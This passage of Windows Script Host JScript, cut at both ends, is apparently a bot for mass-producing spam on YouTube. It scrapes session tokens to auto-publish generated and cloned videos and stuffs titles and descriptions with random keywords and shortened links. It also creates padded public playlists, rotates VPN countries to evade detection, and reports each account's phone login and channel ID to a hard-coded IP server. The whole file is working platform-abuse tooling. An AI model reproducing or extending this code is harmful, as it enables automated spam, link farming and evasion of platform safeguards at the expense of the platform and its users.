            var chanID = "";
            sendData("GET", "https://www.youtube.com","","");
            if(iexml.responseText.indexOf("error-box") !=-1){
                fso.CreateTextFile(me+"/debug.txt").Write(encodeURIComponent(iexml.responseText));
                log("ERROR BOX  - READ "+me+"/debug.txt");
            }
            // log(iexml.responseText);
            // chanID = iexml.responseText.split("channel_external_id\":\"")[1].split("\"")[0];
            chanID = iexml.responseText.split("creator_channel_id")[1].split(":")[1].split("\"")[1].split("\"")[0];
            log(chanID);
            ajax.sendReport("POST","http://37.59.246.141/youtube/index.php/?act=newchannel&phone="+login+"&channelid="+chanID,"","");
            global_channel_id = chanID;
        }catch(errp){
            log("ERROR CHANNEL_ID  - READ "+me+"/CHANNEL_ID.txt");
            fso.CreateTextFile(me+"/debug.txt").Write(encodeURIComponent(iexml.responseText));
        }
    }
    this.generateVideoFromImage = function(params){
        log("generateVideoFromImage()");
        mouseActions.uploadPhoto(params.photoArrayPath);
        var dataArr, headers, inform, session_token, encrypted_project_id;
        videoData = genVideoData(params.videoNamePrefix, params.linkDescription, params.allowDescription, params.shortPath, params.keywordsFile, params.keywordsCount, params.keywordsTitleMode);
        sendData("GET", "https://www.youtube.com/editor?feature=upload", "","");
        dataArr = preloadedData(iexml.responseText, "generateVideoFromImage{}");
        headers = dataArr.header;
        session_token = dataArr.session_token;
        encrypted_project_id = dataArr.encrypted_project_id;
        sendData("POST_JS", "https://www.youtube.com/editor_ajax?action_get_images=1", '{"encrypted_project_id":"'+encrypted_project_id+'","action_get_images":1,"session_token":"'+session_token+'","o":"U"}',headers);
        WScript.Echo("IMG IDS: " + iexml.responseText);
        img_ids = iexml.responseText.split("id\":");
        log(img_ids.length);
        for(var r=1;r<img_ids.length;r++)
            if(img_ids[r].split("\"")[1].split("\"")[0].indexOf(":") !=-1){
                img_id = img_ids[r].split("\"")[1].split("\"")[0];
                log(img_id);break;} //ERROR HERE
        f_time = (10000 + parseInt(Math.random() * 20000));
        s_time = (60000 + parseInt(Math.random() * 30000));
        try{
            log("IMG_ID: "+ img_id);}
        catch(erttyy){return "again";}
        log("LABEL: "+ params.firstPicText);
        log("TITLE: "+ videoData.title);
        sendData("POST_JS", "https://www.youtube.com/editor_ajax?action_publish=1", '{"vc":[{"type":"image","id":"'+img_id+'","start_ms":0,"end_ms":'+f_time+',"length_ms":'+f_time+',"effects":[{"id":"BANNER","parameters":{"banner_height":"30","h_align":"CENTER","banner_opacity":"50","label":"'+params.firstPicText+'","font_face":"Open Sans","v_align":"CENTER","banner_color":"#000000","color":"#ffffff","font_size_class":"xsmall"}}],"image_type":"p"},{"type":"image","id":"'+img_id+'","start_ms":0,"end_ms":'+s_time+',"length_ms":'+s_time+',"effects":[],"image_type":"p"}],"ac":[],"encrypted_project_id":"'+encrypted_project_id+'","title":"'+toUnicode(videoData.title)+'","action_publish":1,"session_token":"'+session_token+'","o":"U"}',headers);
        log("Wait 2 min for render");
        shell.Run("tskill syss", 0, true);
        log("tskill syss - OK!");
        WScript.Sleep(120000);
        fileid = getUploadedVideoId(iexml.responseText);
        if(params.allowDescription){
            try{
                ChangeInfo(fileid, videoData.inform);
            }catch(changeError){
                WScript.Sleep(30000);
                ChangeInfo(fileid, videoData.inform);
            }
        }
        return fileid;
    }
    this.cloneVideo = function(params){
        var fileIdArr = [];
        _errorsCounter = 0;
        var video_from_clone = "";
        for(var i=0;i<params.videoCount-1;i++){
            try{
                sendData("GET", "https://www.youtube.com/editor?feature=upload", "","");
                dataArr = preloadedData(iexml.responseText);
                headers = dataArr.header;
                session_token = dataArr.session_token;
                encrypted_project_id = dataArr.encrypted_project_id;
                videoData = genVideoData(params.videoNamePrefix, params.linkDescription, params.allowDescription, params.shortPath, params.keywordsFile, params.keywordsCount, params.keywordsTitleMode);
                sendData("POST_JS", "https://www.youtube.com/editor_ajax?action_videos=1", '{"q":"","p":1,"lt":"video","qid":1,"action_videos":1,"session_token":"'+session_token+'","o":"U"}',headers);
                if (video_from_clone=="") {
                    video_from_clone = iexml.responseText.split("?id=")[1].split("\\")[0];
                    fileIdArr.push(video_from_clone);
                }
                log("video_from_clone: "+video_from_clone);
                f_time = iexml.responseText.split("length_ms\":")[1].split(",")[0];
                sendData("POST_JS", "https://www.youtube.com/editor_ajax?action_publish=1", '{"vc":[{"type":"video","id":"'+video_from_clone+'","start_ms":0,"end_ms":'+f_time+',"length_ms":'+f_time+',"effects":[]}],"ac":[],"encrypted_project_id":"'+encrypted_project_id+'","title":"'+toUnicode(videoData.title)+'","action_publish":1,"session_token":"'+session_token+'","o":"U"}',headers);
            }catch(errt){
                log("1017  ERROR! " +  errt.message);
                fso.CreateTextFile(me + "/debug1017.txt").Write(encodeURIComponent(iexml.responseText));
                i--;
                log("ERROR 1017 WAIT 60 Sec!");
                if(_errorsCounter > 5)
                    shell.Run("tskill cmd2", 1, true);
                _errorsCounter++;
                WScript.Sleep(30000);
                continue;
            }
            fileid = getUploadedVideoId(iexml.responseText);
            if(fileid == "wait"){
                i--;
                log("ERROR 1034 WAIT 60 Sec!");
                if(_errorsCounter > 5)
                    shell.Run("tskill cmd2", 1, true);
                _errorsCounter++;
                WScript.Sleep(30000);
                continue;
            }

            if(params.allowDescription){
                ChangeInfo(fileid, videoData.inform);
            }
            fileIdArr.push(fileid);
            _errorsCounter = 0;
            log("Wait 10 sec...")
            WScript.Sleep(10000)
        }
        return fileIdArr;
    }
    this.createTextVideo = function(params){
        var dataArr, headers, inform, session_token, encrypted_project_id;
        var fileIdArr= [];
        for(var i=0;i<params.videoCount;i++){
            videoData = genVideoData(params.videoNamePrefix, params.linkDescription, params.allowDescription, params.shortPath);
            sendData("GET", "https://www.youtube.com/editor?feature=upload", "","");
            dataArr = preloadedData(iexml.responseText);
            headers = dataArr.header;
            session_token = dataArr.session_token;
            encrypted_project_id = dataArr.encrypted_project_id;
            var f_time = params.f_time();
            var s_time = params.s_time();

            sendData("POST_JS", "https://www.youtube.com/editor_ajax?action_publish=1", '{"vc":[{"type":"synthetic-video","id":"synthetic","start_ms":0,"end_ms":'+f_time+',"length_ms":'+f_time+',"effects":[{"id":"SOLID_COLOR","parameters":{"color":"#000000"}},{"id":"TITLE","parameters":{"font_face":"Open Sans","label":"'+params.firstPicText+'","color":"#ffffff","font_size_class":"xsmall"}}]},{"type":"synthetic-video","id":"synthetic","start_ms":0,"end_ms":'+s_time+',"length_ms":'+s_time+',"effects":[{"id":"SOLID_COLOR","parameters":{"color":"#000000"}},{"id":"TITLE","parameters":{"label":"'+params.secondPicText+'","font_size_class":"xxsmall","font_face":"Open Sans","color":"#ffffff"}}]}],"ac":[],"encrypted_project_id":"'+encrypted_project_id+'","title":"'+toUnicode(videoData.title)+'","action_publish":1,"session_token":"'+session_token+'","o":"U"}',headers);
            fileid = getUploadedVideoId(iexml.responseText);
            if(params.allowDescription){
                ChangeInfo(fileid, videoData.inform);
            }
            fileIdArr.push(fileid);
            log("Waiting 20 sec");
            WScript.Sleep(20000);
        }
        return fileIdArr;
    }
    this.createPlaylist = function (params){
        log("create_playlists");
        var filmName, description, playlist_name, dtext, video_id,status;
        playlist_cycle:
            while(dtext = keywordsObject.readBase(params.keywordsFile, params.keywordsCount, params.keywordsTitleMode)){
                filmName = dtext.filmname;

                if(params.translateTo == "none"){
                    description = dtext.keywords;
                    playlist_name = dtext.title;
                }else{
                    description = ajax.translate(dtext.keywords, params.translateTo);
                    playlist_name = ajax.translate(dtext.title, params.translateTo);
                }
                log("filmName: "+ filmName);
                log("description: "+ description);
                log("playlist_name: "+ playlist_name);
                log("filmName: "+ filmName);
                // add_video_id_arr = session("add_video_id_arr");
                add_video_id_arr = params.videoIdList;
                if(vid_number > params.playlistCount){return;}

                //////////////   create playlist block
                log("****************\nvid_number: "+ vid_number+" --> "+playlist_name+"\n**************\n")
                video_id = ajax.getVideoFromSearch(filmName, [add_video_id_arr[vid_number % (add_video_id_arr.length-1)]]);
                vid_number ++;
                log(playlist_name);
                log(video_id);
                log(video_id.length);

                // continue; // debug mode
                log("Creating PLAYLIST");
                sendData("GET", "https://www.youtube.com/view_all_playlists", "",[]);
                dataArr = preloadedData(iexml.responseText);
                if (dataArr=="errorLoading") {
                    log("Create Playlist error preloadedData continue...");
                    WScript.Sleep(30000);
                    continue;
                }
                headers = dataArr.header;
                session_token = dataArr.session_token;
                status = sendData("POST", "https://www.youtube.com/playlist_ajax?action_create_playlist=1", "video_ids&source_playlist_id&n="+playlist_name+"&p=public&session_token="+session_token,headers);
                if(iexml.responseText.indexOf("errors") !=-1)
                    continue;
                if(status == "next")
                    continue;
                if(iexml.responseText.indexOf("error") !=-1){
                    if(errors>5){
                        errors=0;
                        log("Reached the limit of 10 000 playlists !!!");
                        WScript.Quit();
                    }
                    errors++;
                }
                playlistId = iexml.responseText.split("playlistId\":")[1].split("\"")[1].split("\"")[0];
                log("playlistId: "+playlistId);
                while(true) {
                    try {
                        sendData("GET", "https://www.youtube.com/playlist?list="+playlistId, "",[]);
                        session_token = encodeURIComponent(iexml.responseText.split("session_token\" value=\"")[1].split("\"")[0]);
                        break;
                    } catch (error_session) {log("error session token for id: " + playlistId); WScript.Sleep(5000);}
                }
                sendData("POST", "https://www.youtube.com/playlist_edit_service_ajax?action_set_playlist_description=1", "playlist_id="+playlistId+"&playlist_description="+encodeURIComponent(description)+"&session_token="+session_token,headers);
                log("PLAYLIST CREATED adding video");
                for(var i=0;i<video_id.length;i++){
                    sendData("GET", "https://www.youtube.com/playlist?list="+playlistId, "",[]);
                    dataArr = preloadedData(iexml.responseText);
                    try {
                        headers = dataArr.header;
                        session_token = iexml.responseText.split("session_token\" value=\"")[1].split("\"")[0];
                    } catch(plerr) {continue playlist_cycle;}
                    log(headers);


                    sendData("POST", "https://www.youtube.com/playlist_edit_service_ajax?action_add_video=1", "video_id="+video_id[i]+"&playlist_id="+playlistId+"&session_token="+encodeURIComponent(session_token), headers);
                }// end for
            }// while
    }// function end

    this.getVideoFromSearch =  function (filmName, vId){
        log("getVideoFromSearch()");
        log("getVideoFromSearch()filmName: "+filmName);
        log("getVideoFromSearch()vId: "+vId);
        var titleWords = filmName.split(" ");
        filmName = titleWords.slice(0, (titleWords.length>3?3:titleWords.length)).join(" ");
        do{
            sendData("GET", "https://www.youtube.com/results?search_query="+encodeURIComponent(filmName), "", "");

            if(iexml.responseText.indexOf("watch?v=") !=-1){
                vids_length = iexml.responseText.split("watch?v=").length;
                if((parseInt(vids_length)/2) > 7){
                    vids_length = 7;
                }
                log("vids_length: " + vids_length)
                for(var v_ids=1;v_ids<vids_length;v_ids+=2){
                    log("**************************\nVideoFromSearch: " + iexml.responseText.split("watch?v=")[v_ids].split("\"")[0].split("\u0026")[0])
                    vId.push(iexml.responseText.split("watch?v=")[v_ids].split("\"")[0].split("\u0026")[0]);
                }
                return vId;
            }else{
                log("No video in SEARCH! try to remove last word");
                var filmNameState = ajax.splitLastWord(filmName);
                filmName = filmNameState.searchText;
                log("getVideoFromSearch()filmNameSUBSTR: "+filmName);
                if(filmName =="")
                    return vId;
            }
        }while(filmNameState.state)
        return vId;
    }
    this.splitLastWord = function(text){
        var arr = text.split(" ")
        if(arr.length > 1){
            text = arr.slice(0, arr.length - 1).join(" ");
            return {searchText: text, state: true};
        }else{
            return {searchText: text, state: false};
        }
        // var newText = "";
        // for(var i=0;i<text.split(" ").length-1;i++){
        // if(i == text.split(" ").length-2)
        // newText +=text.split(" ")[i];
        // else
        // newText +=text.split(" ")[i] + " ";
        // }
        // return {searchText: newText, state: true};
    }
    this.getTitlesFromSearch = function(title){
        String.prototype.removeSymb=function(){
            return this.replace(/<\/?[^>]+(>|$)/g, " ").replace(/[^а-яА-Яa-zA-Z0-9/ ]/g, " ").replace(/ +(?= )/g,' ').split("  ").join(" ");
        }
        vId = "";
        log("getTitlesFromSearch()");
        // log("filmName: "+title);
        var link = "https://www.youtube.com/results?search_query="+encodeURIComponent(title);
        while (vId.length < 1000) {
            sendData("GET", link , "", "");
            if(iexml.responseText.indexOf("watch?v=") !=-1){
                var data = iexml.responseText.split("yt-lockup-content");
                vids_length = data.length;
                // log(vids_length);
                for(var v_ids=1;v_ids<vids_length;v_ids++){
                    var videoTitle = (data[v_ids].split("title=\"")[1].split("\"")[0]);
                    vId += videoTitle  + " ";
                    //WScript.Echo(videoTitle);
                }
            }else
                break;
            if(iexml.responseText.indexOf("search-pager") ==-1){
                fso.CreateTextFile(me+"/STRING_1226.txt").Write(encodeURIComponent(iexml.responseText));
                break;
            }
            len = iexml.responseText.split("search-pager")[1].split("</div>")[0].split("href=\"").length-1;
            link = "https://www.youtube.com"+iexml.responseText.split("search-pager")[1].split("</div>")[0].split("href=\"")[len].split("\"")[0];
        }
        vId = vId.removeSymb();
        var rSize = parseInt(3 + Math.random() * 5);
        var wordsArr = vId.split(" ");
        var ttl = "";
        for (var i=0;i<rSize;i++) {
            ttl += wordsArr[parseInt(Math.random() * wordsArr.length)] + " "
        }
        return {keys:vId.substr(0,1000), title: ttl};
    }
    this.translate = function(text, lang) {
        log("translate()");
        log("https://translate.yandex.net/api/v1.5/tr.json/translate?key="+nowTranslateKey+"&text=" + ("text") +"&lang="+lang);
        sendData("GET", "https://translate.yandex.net/api/v1.5/tr.json/translate?key="+nowTranslateKey+"&text=" + encodeURIComponent(text) +"&lang="+lang, 0)
        log(iexml.responseText);
        return(eval("tlan="+iexml.responseText)["text"][0]);
    }
    function sendData(method, url, data, headers) {
        for (var im=1;im<=10;im++) {
            try {
                switch(method){
                    case "OCTET_STREAM":
                        method = "POST"; type = "application/octet-stream";
                        headers = [["X-HTTP-Method-Override","PUT"],["X-GUploader-No-308","yes"],["Connection","Keep-Alive"],["Cache-Control","no-cache"]]
                        break;
                    case "POST_JS":
                        method = "POST"; type = "application/json";
                        break;
                    case "POST":
                        type = "application/x-www-form-urlencoded";
                        break;
                }
                iexml.abort();
                iexml.open(method, url, 1);
                // log("Ajax URL: " + url);
                // log("Ajax data: " + data);
                iexml.setRequestHeader("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, image/jxr, */*;q=0.1");
                iexml.setRequestHeader("Accept-Language", "en-US,en;q=0.7,ru;q=0.3");
                iexml.setRequestHeader("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36");
                try{
                    for (var i=0;i<headers.length;i++) {
                        iexml.setRequestHeader(headers[i][0], headers[i][1]);
                    }
                }catch(e){}
                if (method=="POST") iexml.setRequestHeader ("Content-Type", type);
                iexml.send(data);
                var timer=0;
                while(timer < 60000) {
                    // log("Ajax readyState: " + iexml.readyState);
                    if (iexml.readyState == 4) {
                        // log("Ajax status: " + iexml.status);
                        if (iexml.status == 200 || iexml.status == 500|| iexml.status == 400)
                            if(iexml.responseText.indexOf("errors") !=-1)
                                return "next";
                        return iexml.responseText;
                        if (iexml.status == 12029 || iexml.status == 0)
                            throw 1;
                    }

                    WScript.Sleep(50);
                    timer+=50;
                }
                throw 1;
                log("connection timeout");
            } catch(errcon) {
                log("ajax error " + im + " of 10 " + errcon.message);
                WScript.Sleep(10000);
            }
        }
        shell.Run("tskill cmd2", 1, true);
    }
    function toUnicode(theString) {
        var unicodeString = '';
        for (var i=0; i < theString.length; i++) {
            var theUnicode = theString.charCodeAt(i).toString(16).toUpperCase();
            while (theUnicode.length < 4) {
                theUnicode = '0' + theUnicode;
            }
            theUnicode = '\\u' + theUnicode;
            unicodeString += theUnicode;
        }
        return unicodeString;
    }
    function getUploadedVideoId(responseText){
        try{
            log("video_id: " +responseText.split("video_id\":")[1].split("\"")[1].split("\"")[0]);
            _errors = 0;
            return responseText.split("video_id\":")[1].split("\"")[1].split("\"")[0];
        }catch(errt){log("1034 ERROR "+ errt.message);	fso.CreateTextFile(me + "/debug1034.txt").Write(encodeURIComponent(responseText));return "wait";}
    }
    function ChangeInfo(fileid, inform) {
        WScript.Echo(fileid + " заполнение информации... ");
        doccha = new ActiveXObject("HTMLFile");
        sendData("GET", "https://www.youtube.com/edit?video_id="+fileid, "", "");
        doccha.open();
        doccha.write(iexml.responseText);
        doccha.close();
        dataArr = preloadedData(iexml.responseText);
        headers = dataArr.header;
        session_token = encodeURIComponent(dataArr.session_token);
        var postdata = [
            "notify_via_email=true",
            "share_emails",
            "deleted_ogids",
            "deleted_circle_ids",
            "deleted_emails",
            "privacy_draft=none",
            "thumbnail_preview_version",
            "session_token="+session_token, //encodeURIComponent(iexml.responseText.split("session_token = \"")[1].split("\"")[0])
            "updated_flag=0",
            "video_id="+fileid,
            "content_id=",
            "title="+encodeURIComponent(doccha.forms[2].title.value),
            "description="+encodeURIComponent(inform),
            "keywords="+encodeURIComponent(doccha.forms[2].title.value),
            "still_id=2",
            "creator_share_custom_message=",
            "captions_certificate_reason=",
            "privacy=public",
            "category=22",
            "allow_comments=no",
            "creator_share_feeds=yes",
            "reuse=all_rights_reserved",
            "audio_language",
            "recorded_date",
            "allow_public_stats=yes",
            "creator_share_gplus=no",
            "creator_share_twitter=no",
            "self_racy=no",
            "captions_crowdsource=no",
            "allow_comments_detail=approval",
            "allow_comment_ratings=yes",
            "allow_ratings=yes",
            "allow_responses=yes",
            "allow_responses_detail=approval",
            "allow_syndication=yes",
            "allow_embedding=yes",
            "location_latitude",
            "location_longitude",
            "location_altitude",
            "recorded_date",
            "threed_type=default",
            "threed_type_original=default",
            "threed_layout=1",
            "modified_fields=description%2Callow_comments%2Cprivacy"
        ];
        sendData("POST", "https://www.youtube.com/metadata_ajax?action_edit_video=1", postdata.join("&"), headers);
        WScript.Echo("Информация заполнена!");
    }
    this.genVideoData = genVideoData;
    function genVideoData(videoNamePrefix, linkDescription, allowDescription, shortPath, keywordsFile, keywordsCount, keywordsTitleMode){
        var rvname, inform, keys;

        // keys = keywordsObject.readBase(keywordsFile, keywordsCount, keywordsTitleMode);
        // keys = ajax.getRemote();  // FORCED CAN BE REMOVED

        rvname = videoNamePrefix + (parseInt(1000000 + Math.random() * 9999999 ));

        //rvname = keys.title; // FORCED CAN BE REMOVED

        if(allowDescription)
            inform = "http://"+sendData("POST", shortPath , "", "")+" - "+linkDescription;// + "\n\n\n"+keys.keywords;
        else
            inform = "";
        return {title: rvname, inform : inform};
    }
    function preloadedData (data, from){
        log("Was execute from -> " + from);
        var t = fso.CreateTextFile(me+"/preloaded_DEBUG.txt");
        t.Write(encodeURIComponent(data));
        t.close();
        try{
            session_token = data.split("XSRF_TOKEN': \"")[1].split("\"")[0];
            X_YouTube_Variants_Checksum = data.split("VARIANTS_CHECKSUM': \"")[1].split("\"")[0];
            X_YouTube_Page_Label = data.split("PAGE_BUILD_LABEL': \"")[1].split("\"")[0];
            X_YouTube_Page_CL = data.split("PAGE_CL': ")[1].split(",")[0];
            X_YouTube_Client_Version = data.split("INNERTUBE_CONTEXT_CLIENT_VERSION: \"")[1].split("\"")[0];
        }catch(poweqezsda){
            log("preloadedData CATCH!!!!! LOOK HERE!!!");
            return "errorLoading";
            session_token = data.split("XSRF_TOKEN")[1].split(":")[1].split("\"")[1].split("\"")[0];
            X_YouTube_Variants_Checksum = data.split("VARIANTS_CHECKSUM")[1].split(":")[1].split("\"")[1].split("\"")[0];
            X_YouTube_Page_Label = data.split("PAGE_BUILD_LABEL")[1].split(":")[1].split("\"")[1].split("\"")[0];
            X_YouTube_Page_CL = data.split("PAGE_CL")[1].split(":")[1].split(" ")[1].split(",")[0];
            X_YouTube_Client_Version = data.split("INNERTUBE_CONTEXT_CLIENT_VERSION")[1].split(":")[1].split("\"")[1].split("\"")[0];
        }
        try{
            encrypted_project_id = data.split("VIDEO_EDITOR_PROJECT_LIST")[1].split("id\":\"")[1].split("\"")[0]
        }catch(yyuuuu){
            encrypted_project_id = ""
        }
        return {header: [["X-YouTube-Variants-Checksum", X_YouTube_Variants_Checksum],["X-YouTube-Page-Label", X_YouTube_Page_Label],["X-YouTube-Page-CL", X_YouTube_Page_CL],["X-YouTube-Client-Version", X_YouTube_Client_Version]], session_token: session_token, encrypted_project_id: encrypted_project_id};
    }
}

function mouseEvents() {
    var base = [];
    this.resizeWindowBeforeStart = function(){
        browser.youtube.resizeIeWindow();
        base["maximize_window"] = "1288,15";
        simulate("maximize_window");
        log("maximize_window");
        WScript.Sleep(2000);
        maximize = false;
    };
    this.clickAndWriteToSearchField = function(template){
        base["another_tab"] = "821,136";
        // base["search_field"] = "346,80";
        base["search_field"] = "353,85";
        simulate("another_tab", "YouTube");
        WScript.Sleep(3000);
        simulate("search_field", "YouTube");
        WScript.Sleep(1000);
        shell.sendKeys(template);
        WScript.Sleep(5000);
    }
    this.addVideoToPlayList = function(template, first){
        WScript.Sleep(3000);
        base["search_field"] = "373,251";
        simulate("search_field", "YouTube");
        WScript.Sleep(1000);
        shell.sendKeys(template);
        base["search_button"] = "661,251";
        simulate("search_button", "YouTube");
        WScript.Sleep(3000);
        if(!first) {
            base["select_video"] = "301,334";
            simulate("select_video", "YouTube");
            base["select_video"] = "271,435";
            simulate("select_video", "YouTube");
            base["select_video"] = "265,530";
            simulate("select_video", "YouTube");
        }else{
            base["select_video"] = "301,334";
            simulate("select_video", "YouTube");
        }
        base["add_button"] = "237,613";
        simulate("add_button", "YouTube");
        base["add_button"] = "237,635";
        //base["add_button"] = "237,650";
        simulate("add_button", "YouTube");
    }
    this.addDescription = function (description){
        log("ADDING DESCRIPTION");
        // base["descr_field"] = "682,200";
        // simulate("descr_field", "YouTube");
        // shell.sendKeys(description, 1);
        shell.sendKeys("^{v}");;
        WScript.Sleep(5000);
        base["blur"] = "1243,249";
        simulate("blur", "YouTube");
        WScript.Sleep(5000);
    }
    this.createChannel = function (cmode){
        if(maximize) {
            browser.youtube.resizeIeWindow();
            base["maximize_window"] = "1288,15";
            simulate("maximize_window");
            WScript.Sleep(2000);
            maximize = false;
        }
        if(cmode == "channel_name"){
            base["check_group"] = "329,298";
            simulate("check_group", "YouTube");
            WScript.Sleep(2000);
            simulate("check_group", "YouTube");
        }else{
            base["add_video"] = "1200,85";
            simulate("add_video", "YouTube");
            base["add_video"] = "1200,120";
            simulate("add_video", "YouTube");
            WScript.Sleep(3000);
            base["create_channel"] = "827,515";
            simulate("create_channel", "YouTube");
            base["create_channel"] = "827,540";
            simulate("create_channel", "YouTube");
            WScript.Sleep(15000);
        }
    }
    this.cyberGhost = function cyberghost(country){
        var t=0;
        if(globalSession("countryPos") >= country.length)
            t = 0;
        else
            t = globalSession("countryPos");
        base["get_country"] = "167,667";
        base["search"] = "608,98";
        base["check"] = "64,163";
        base["connect"] = "278,694";
        base["accept"] = "590,652";
        base["open_ie"] = "89,746";
        base["open_cg"] = "144,747";
        simulate("open_cg");
        simulate("get_country");
        WScript.Sleep(10000);
        simulate("search");
        WScript.Sleep(1000);
        shell.SendKeys(country[t]);
        WScript.Sleep(1000);
        simulate("check");
        simulate("connect");
        simulate("accept");
        t++;
        globalSession("countryPos", t);
    }
    this.closeFlash = function() {
        base["flash"] = "863,441";
        simulate("flash", "Видеоредактор");
        WScript.Sleep(3000);
    }
    this.uploadPhoto = function chooser_photo(photo_file){ // //////!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

        log("chooser_photo()");
        var t = 0;
        if(session("picPos") >= photo_file.length-1)
            t = 0;
        else
            t = session("picPos");
        shell.Run("tskill syss", 0, true);
        browser.youtube.checkingErrorsOnChannel();
        var me = fso.getParentFolderName(WScript.ScriptFullName);
        if(maximize) {
            browser.youtube.resizeIeWindow();
            WScript.Sleep(2000);
            // base["resize_window"] = "1076,13";
            // base["resize_window"] = "1132,18";
            base["maximize_window"] = "1288,15";
            simulate("maximize_window");
            log("maximize_window");
            WScript.Sleep(2000);
            maximize = false;
        }
        base["closeX"] = "1317,74";
        simulate("closeX", "Видеоредактор");
        WScript.Sleep(3000);

        base["flash"] = "863,441";
        simulate("flash", "Видеоредактор");
        WScript.Sleep(3000);

        base["teamviewer"] = "845,435";
        base["close_lang"] = "1321,133";
        base["close_lang2"] = "1306,133";
        log(" coord");
        // base["add_photo"] = "625,210";
        base["add_photo"] = "653,214";
        base["more"] = "565,279";
        base["upl_photo"] = "600,160";
        base["select_photo"] = "689,453";
        base["select_photo2"] = "689,465";
        base["select_photo3"] = "689,475";
        simulate("teamviewer", "Видеоредактор");
        log("teamviewer coord");
        WScript.Sleep(3000);
        simulate("close_lang", "Видеоредактор");
        WScript.Sleep(3000);
        simulate("close_lang2", "Видеоредактор");
        log("close_lang coord");
        WScript.Sleep(3000);
        simulate("add_photo", "Видеоредактор");
        log("add_photo coord");
        WScript.Sleep(3000);
        simulate("more", "Видеоредактор");
        log("more coord");
        WScript.Sleep(25000);
        simulate("upl_photo", "Видеоредактор");
        log("upl_photo coord");
        WScript.Sleep(3000);
        var file = photo_file[t];
        WScript.Echo("Uploading photo file: " + photo_file[t]);
        shell.Run(fso.getFile(me + "\\syss.exe").shortPath+" "+file+"|test", 1);
        log("FileDialog hooker started");
        WScript.Sleep(5000);
        simulate("select_photo", "Видеоредактор");
        simulate("select_photo2", "Видеоредактор");
        simulate("select_photo3", "Видеоредактор");
        log("FileDialog window opened");
        WScript.Sleep(15000);
        log("FileDialog OK");
        // shell.Run("cmd /c tasklist > "+me+"/1.txt");
        // if(fso.GetFile().openastextstream(1,0).readAll().indexOf("iexplore") == -1) {log("IE DEAD!!!")};
        t++;
        session("picPos", t);
    }
    function simulate(dname, title) {
        var au3Script = fso.createTextFile(me + "/tempscript.au3");
        au3Script.Write('#include <AutoItConstants.au3>\r\n' +
            'WinActivate ( "'+title+'" )\r\n'+
            'MouseMove('+base[dname]+')\r\n' +
            'MouseClick($MOUSE_CLICK_LEFT)\r\n');
        au3Script.close();
        shell.Run("cmd /c " + me + "/tempscript.au3", 0, true);
        WScript.Sleep(1000);
        /*
         WScript.Sleep(1000);
         log("emulator3.exe " + base[dname]);
         shell.Run("emulator3.exe " + base[dname], 1, true);
         WScript.Sleep(1000);
         */
    }
}

function keywordsClass() {
    this.mixing = false;
    this.enableLoop = true;

    this.resetBase = function(filePath) {
        session(fso.getFileName(filePath), {lineNumber: 0, keywordIndex: 0, titleIndex: 0});
    }

    /*
     var text = "...";
     var stopwords = ["fuck", "boob", "cock", "mature","tits","sex","amateur", "tranny", "anal", "blonde"];
     var counters = {};

     var words = text.split(" ");
     var results = [];

     for (var i=0;i<words.length;i++) {
     var remove = false;
     for (var j=0;j<stopwords.length;j++) {
     if (words[i].toLowerCase().indexOf(stopwords[j].toLowerCase())!=-1) {
     counters[stopwords[j]] = counters[stopwords[j]] || 0;
     counters[stopwords[j]]++;
     if (counters[stopwords[j]]>0)  remove=true;
     }
     }
     if (!remove) results.push(words[i]);
     }
     console.log(counters);
     console.log(results.join(" "));
     */
    var userWords = " ";

    this.readRandomBase = function(filePath, keysCount, titleMode) {

        //keysCount = 1500; // FORCED CAN BE REMOVED

        var fileLines = fso.getFile(filePath).OpenAsTextStream(1,0).readall();
        var words = fileLines.split(" ");
        log("words count: " + words.length);
        var wcount = words.length;
        var currentPack = "";
        var title = "";
        var titleWordsCount = 5 + parseInt(Math.random() * 5);
        var id = 0;
        while(currentPack.length < keysCount) {
            var testWord = words[parseInt(Math.random() * wcount)].toLowerCase().split(" ").join("");
            log(testWord.substr(0, parseInt(testWord.length * 0.6)));
            if (userWords.indexOf(" "+testWord.substr(0, parseInt(testWord.length * 0.7))) == -1) {
                currentPack += testWord + " ";
                userWords += testWord + " ";
            }
        }

        for (var i=0;i<titleWordsCount;i++) {
            while(true) {
                var testWord = words[parseInt(Math.random() * wcount)].toLowerCase().split(" ").join("");
                log("SUBSTR: " + testWord.substr(0, parseInt(testWord.length * 0.6)));
                if (userWords.indexOf(" "+testWord.substr(0, parseInt(testWord.length * 0.7))) == -1) {
                    title += testWord + " ";
                    userWords += testWord + " ";
                    break;
                }
            }
        }

        title = title.substr(0, 1).toUpperCase() + title.substr(1).toLowerCase();

        filmname = title;

        var noiseKeywords = readStory(1900 - keysCount, titleMode);//ajax.getRemote().keywords.substr(0, 1900 - keysCount);

        return {id: id, filmname: filmname, title: title, keywords: mix(currentPack.split(" "),  noiseKeywords.split(" "))};
    }

    this.readExpressions = function(filePath, keysCount, titleMode) {
        var id = 0;
        var fileLines = fso.getFile(filePath).OpenAsTextStream(1,0).readall().split("\r\n");
        var stringElements = fileLines[0].split(";")[2].split(",");
        var currentPack = "";
        var title = "";
        while(currentPack.length < keysCount) {
            var rExpression = stringElements[parseInt(Math.random() * stringElements.length)].replace(/[^a-zA-Z ]/g, "");

            var testWords = rExpression.split(" ");

            var test = true;
            for (var i=0;i<testWords.length;i++)
                if (used.indexOf(testWords[i].toLowerCase() + " ")!=-1 && testWords[i].length > 2) {
                    test = false;
                    break;
                }

            if (test) {
                if (title == "") {
                    if (rExpression.length < 10) continue;
                    title = rExpression.toLowerCase();
                }
                else currentPack += rExpression.toLowerCase() + " ";

                used += rExpression.toLowerCase() + " ";
            }
        }

        filmname = title;

        var noiseKeywords = readStory(1900 - keysCount, titleMode);//ajax.getRemote().keywords.substr(0, 1900 - keysCount);

        return {id: id, filmname: filmname, title: title, keywords: mix(currentPack.split(" "),  noiseKeywords.split(" "))};
    }

    this.readBase = function(filePath, keysCount, titleMode) {
        return this.readRandomBase(filePath, keysCount, titleMode);
        //return this.readRandomBase(filePath, keysCount, titleMode); //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        var filmname, keywords, titles, id;
        function readLineData() {
            // log("current line: " + fileLines[position.lineNumber]);
            var stringElements = fileLines[position.lineNumber].split(";");
            id = stringElements[0];
            filmname = stringElements[1];
            try {
                keywords = stringElements[2].split(",");
